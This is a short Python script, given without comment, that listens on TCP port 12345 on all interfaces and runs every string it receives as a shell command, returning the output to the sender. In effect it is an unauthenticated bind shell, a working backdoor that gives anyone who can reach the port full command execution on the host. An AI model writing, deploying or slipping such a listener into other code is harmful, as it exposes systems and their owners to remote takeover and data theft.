import socket
import subprocess

HOST = ''
PORT = 12345
SIZE = 1024

ADDR = (HOST, PORT)

ser = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ser.bind(ADDR)
ser.listen(2)

while True:
    cli, address = ser.accept()
    cmd = cli.recv(SIZE)
    session = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    result = session.stdout.read()
    cli.sendall(bytes(result))
    cli.close()
